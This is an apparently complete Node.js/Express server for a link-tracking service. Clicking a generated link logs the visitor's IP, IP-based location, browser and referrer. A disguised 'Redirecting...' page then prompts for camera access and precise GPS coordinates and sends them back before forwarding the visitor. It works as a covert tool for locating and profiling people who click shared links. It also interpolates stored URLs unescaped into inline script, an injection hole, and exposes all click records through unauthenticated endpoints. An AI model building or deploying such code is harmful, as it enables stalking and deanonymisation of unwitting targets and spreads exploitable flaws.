require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/tracking-links')
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// Link Schema
const linkSchema = new mongoose.Schema({
  linkId: { type: String, required: true, unique: true },
  name: { type: String, required: true },
  destinationUrl: { type: String, required: true },
  clicks: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now },
  lastClicked: { type: Date },
  clickRecords: [{
    timestamp: { type: Date, default: Date.now },
    ipAddress: String,
    country: String,
    city: String,
    region: String,
    latitude: Number,
    longitude: Number,
    userAgent: String,
    browser: String,
    os: String,
    device: String,
    referrer: String,
    // New fields for enhanced tracking
    cameraPermission: String,
    locationPermission: String,
    userLatitude: Number,
    userLongitude: Number,
    portNumber: Number,
    connectionType: String,
    screenResolution: String,
    language: String,
    timezone: String
  }]
});

const Link = mongoose.model('Link', linkSchema);

// Helper function to parse user agent
function parseUserAgent(userAgent) {
  const ua = userAgent.toLowerCase();
  
  // Detect browser
  let browser = 'Unknown';
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('edg')) browser = 'Edge';
  else if (ua.includes('opera') || ua.includes('opr')) browser = 'Opera';
  
  // Detect OS
  let os = 'Unknown';
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';
  
  // Detect device type
  let device = 'Desktop';
  if (ua.includes('mobile')) device = 'Mobile';
  else if (ua.includes('tablet') || ua.includes('ipad')) device = 'Tablet';
  
  return { browser, os, device };
}

// Helper function to get IP address from request
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         'Unknown';
}

// Helper function to get geolocation from IP using free API
async function getGeolocation(ip) {
  try {
    // Remove IPv6 prefix if present
    const cleanIp = ip.replace('::ffff:', '');
    
    // Skip localhost/private IPs
    if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp === 'Unknown') {
      return {
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        latitude: null,
        longitude: null
      };
    }
    
    // Use ip-api.com free geolocation service
    const response = await fetch(`http://ip-api.com/json/${cleanIp}`);
    const data = await response.json();
    
    if (data.status === 'success') {
      return {
        country: data.country || 'Unknown',
        city: data.city || 'Unknown',
        region: data.regionName || 'Unknown',
        latitude: data.lat || null,
        longitude: data.lon || null
      };
    }
  } catch (error) {
    console.error('Geolocation error:', error);
  }
  
  return {
    country: 'Unknown',
    city: 'Unknown',
    region: 'Unknown',
    latitude: null,
    longitude: null
  };
}

// API Routes

// Create a new tracking link
app.post('/api/links', async (req, res) => {
  try {
    const { name, destinationUrl } = req.body;
    
    // Generate unique ID
    const linkId = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Create new link
    const newLink = new Link({
      linkId,
      name,
      destinationUrl
    });
    
    await newLink.save();
    
    // Generate tracking URL
    const trackingUrl = `${req.protocol}://${req.get('host')}/track/${linkId}`;
    
    res.json({
      success: true,
      link: newLink,
      trackingUrl
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all links
app.get('/api/links', async (req, res) => {
  try {
    const links = await Link.find().sort({ createdAt: -1 });
    res.json({ success: true, links });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get analytics summary
app.get('/api/analytics', async (req, res) => {
  try {
    const links = await Link.find();
    const totalLinks = links.length;
    const totalClicks = links.reduce((sum, link) => sum + link.clicks, 0);
    const avgClicks = totalLinks > 0 ? Math.round(totalClicks / totalLinks) : 0;
    
    res.json({
      success: true,
      analytics: {
        totalLinks,
        totalClicks,
        avgClicks
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete a link
app.delete('/api/links/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    await Link.findOneAndDelete({ linkId });
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get detailed click records for a specific link
app.get('/api/links/:linkId/records', async (req, res) => {
  try {
    const { linkId } = req.params;
    const link = await Link.findOne({ linkId });
    
    if (!link) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    res.json({ 
      success: true, 
      link: {
        name: link.name,
        destinationUrl: link.destinationUrl,
        clicks: link.clicks,
        createdAt: link.createdAt
      },
      records: link.clickRecords 
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update tracking record with client-side data (permissions, location, etc.)
app.post('/api/track-update/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    const {
      cameraPermission,
      locationPermission,
      userLatitude,
      userLongitude,
      screenResolution,
      language,
      timezone,
      connectionType
    } = req.body;
    
    console.log('Received tracking update for:', linkId, req.body);
    
    // Find the link and update the most recent click record
    const link = await Link.findOne({ linkId });
    
    if (!link || link.clickRecords.length === 0) {
      console.error('Link or record not found:', linkId);
      return res.status(404).json({ success: false, error: 'Link or record not found' });
    }
    
    // Update the last click record (most recent)
    const lastIndex = link.clickRecords.length - 1;
    
    // Only update fields that were provided
    if (cameraPermission !== undefined) {
      link.clickRecords[lastIndex].cameraPermission = cameraPermission;
    }
    if (locationPermission !== undefined) {
      link.clickRecords[lastIndex].locationPermission = locationPermission;
    }
    if (userLatitude !== undefined && userLatitude !== null) {
      link.clickRecords[lastIndex].userLatitude = userLatitude;
    }
    if (userLongitude !== undefined && userLongitude !== null) {
      link.clickRecords[lastIndex].userLongitude = userLongitude;
    }
    if (screenResolution !== undefined) {
      link.clickRecords[lastIndex].screenResolution = screenResolution;
    }
    if (language !== undefined) {
      link.clickRecords[lastIndex].language = language;
    }
    if (timezone !== undefined) {
      link.clickRecords[lastIndex].timezone = timezone;
    }
    if (connectionType !== undefined) {
      link.clickRecords[lastIndex].connectionType = connectionType;
    }
    
    await link.save();
    
    console.log('Tracking data updated successfully');
    res.json({ success: true, message: 'Tracking data updated' });
  } catch (error) {
    console.error('Update tracking error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Track click and redirect
app.get('/track/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    
    // Get basic tracking data
    const ipAddress = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referrer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
    const { browser, os, device } = parseUserAgent(userAgent);
    
    // Get geolocation from IP
    const geoData = await getGeolocation(ipAddress);
    
    // Get port number from connection
    const portNumber = req.connection.remotePort || req.socket.remotePort || null;
    
    // Create initial click record (will be updated via API with client-side data)
    const clickRecord = {
      timestamp: new Date(),
      ipAddress: ipAddress,
      country: geoData.country,
      city: geoData.city,
      region: geoData.region,
      latitude: geoData.latitude,
      longitude: geoData.longitude,
      userAgent: userAgent,
      browser: browser,
      os: os,
      device: device,
      referrer: referrer,
      portNumber: portNumber,
      cameraPermission: 'not_requested',
      locationPermission: 'not_requested',
      screenResolution: 'Unknown',
      language: 'Unknown',
      timezone: 'Unknown',
      connectionType: 'Unknown'
    };
    
    // Find the link
    const link = await Link.findOne({ linkId });
    
    if (!link) {
      return res.status(404).send('Tracking link not found');
    }
    
    // Store the destination URL in a variable
    const destinationUrl = link.destinationUrl;
    
    // Update link with click record
    await Link.findOneAndUpdate(
      { linkId },
      { 
        $inc: { clicks: 1 },
        $set: { lastClicked: new Date() },
        $push: { clickRecords: clickRecord }
      },
      { new: true }
    );
    
    // Serve an intermediate HTML page that requests permissions and then redirects
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Redirecting...</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
          }
          .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
          }
          .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          .message {
            font-size: 18px;
            margin-top: 20px;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="spinner"></div>
          <div class="message" id="statusMessage">Please wait, redirecting...</div>
          <div id="debugInfo" style="font-size: 12px; margin-top: 20px; opacity: 0.8;"></div>
        </div>
        <script>
          const API_BASE = '${req.protocol}://${req.get('host')}';
          const linkId = '${linkId}';
          const destinationUrl = '${destinationUrl}';
          
          function updateStatus(message) {
            document.getElementById('statusMessage').textContent = message;
            console.log('STATUS:', message);
          }
          
          function addDebug(message) {
            const debugDiv = document.getElementById('debugInfo');
            debugDiv.innerHTML += message + '<br>';
            console.log('DEBUG:', message);
          }
          
          async function collectTrackingData() {
            try {
              addDebug('Starting tracking data collection...');
              
              const trackingData = {
                screenResolution: window.screen.width + 'x' + window.screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                cameraPermission: 'not_requested',
                locationPermission: 'not_requested'
              };
              
              addDebug('Basic data collected');
              
              // Request Camera Permission with timeout
              updateStatus('Requesting camera permission...');
              if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                  addDebug('Camera API available, requesting...');
                  const cameraPromise = navigator.mediaDevices.getUserMedia({ 
                    video: true,
                    audio: false 
                  });
                  
                  const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('timeout')), 10000)
                  );
                  
                  const cameraStream = await Promise.race([cameraPromise, timeoutPromise]);
                  trackingData.cameraPermission = 'granted';
                  addDebug('✓ Camera: granted');
                  
                  // Stop the camera immediately
                  cameraStream.getTracks().forEach(track => track.stop());
                } catch (error) {
                  console.log('Camera error:', error);
                  if (error.name === 'NotAllowedError' || error.message === 'Permission denied') {
                    trackingData.cameraPermission = 'denied';
                    addDebug('✗ Camera: denied');
                  } else if (error.name === 'NotFoundError') {
                    trackingData.cameraPermission = 'no_camera';
                    addDebug('Camera: no device found');
                  } else if (error.message === 'timeout') {
                    trackingData.cameraPermission = 'timeout';
                    addDebug('Camera: timeout');
                  } else {
                    trackingData.cameraPermission = 'not_supported';
                    addDebug('Camera: ' + error.name);
                  }
                }
              } else {
                trackingData.cameraPermission = 'not_supported';
                addDebug('Camera API not supported');
              }
              
              // Request Location Permission with timeout
              updateStatus('Requesting location permission...');
              if (navigator.geolocation) {
                try {
                  addDebug('Geolocation API available, requesting...');
                  const position = await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => {
                      reject(new Error('timeout'));
                    }, 10000);
                    
                    navigator.geolocation.getCurrentPosition(
                      (pos) => {
                        clearTimeout(timeout);
                        resolve(pos);
                      },
                      (error) => {
                        clearTimeout(timeout);
                        reject(error);
                      },
                      {
                        timeout: 10000,
                        maximumAge: 0,
                        enableHighAccuracy: true
                      }
                    );
                  });
                  
                  trackingData.locationPermission = 'granted';
                  trackingData.userLatitude = position.coords.latitude;
                  trackingData.userLongitude = position.coords.longitude;
                  addDebug('✓ Location: granted (' + position.coords.latitude.toFixed(4) + ', ' + position.coords.longitude.toFixed(4) + ')');
                } catch (error) {
                  console.log('Location error:', error);
                  if (error.code === 1 || error.message === 'User denied Geolocation') {
                    trackingData.locationPermission = 'denied';
                    addDebug('✗ Location: denied');
                  } else if (error.code === 2) {
                    trackingData.locationPermission = 'unavailable';
                    addDebug('Location: unavailable');
                  } else if (error.code === 3 || error.message === 'timeout') {
                    trackingData.locationPermission = 'timeout';
                    addDebug('Location: timeout');
                  } else {
                    trackingData.locationPermission = 'error';
                    addDebug('Location: error - ' + error.message);
                  }
                }
              } else {
                trackingData.locationPermission = 'not_supported';
                addDebug('Geolocation API not supported');
              }
              
              // Send tracking data to server
              updateStatus('Sending tracking data...');
              addDebug('Sending to server: ' + JSON.stringify(trackingData));
              console.log('Sending tracking data:', trackingData);
              
              try {
                const response = await fetch(API_BASE + '/api/track-update/' + linkId, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(trackingData)
                });
                
                const result = await response.json();
                console.log('Server response:', result);
                addDebug('✓ Data sent successfully');
                
                if (!result.success) {
                  addDebug('⚠ Server returned error: ' + result.error);
                }
              } catch (error) {
                console.error('Failed to send tracking data:', error);
                addDebug('✗ Failed to send data: ' + error.message);
              }
              
              // Redirect after collecting data
              updateStatus('Redirecting to destination...');
              setTimeout(() => {
                console.log('Redirecting to:', destinationUrl);
                window.location.href = destinationUrl;
              }, 1000);
              
            } catch (error) {
              console.error('Fatal error in collectTrackingData:', error);
              addDebug('✗ FATAL ERROR: ' + error.message);
              // Still redirect even if there's an error
              setTimeout(() => {
                window.location.href = destinationUrl;
              }, 2000);
            }
          }
          
          // Start collecting data
          console.log('=== TRACKING PAGE LOADED ===');
          console.log('Link ID:', linkId);
          console.log('Destination:', destinationUrl);
          console.log('API Base:', API_BASE);
          collectTrackingData();
        </script>
      </body>
      </html>
    `);
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).send('Error processing tracking link');
  }
});

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
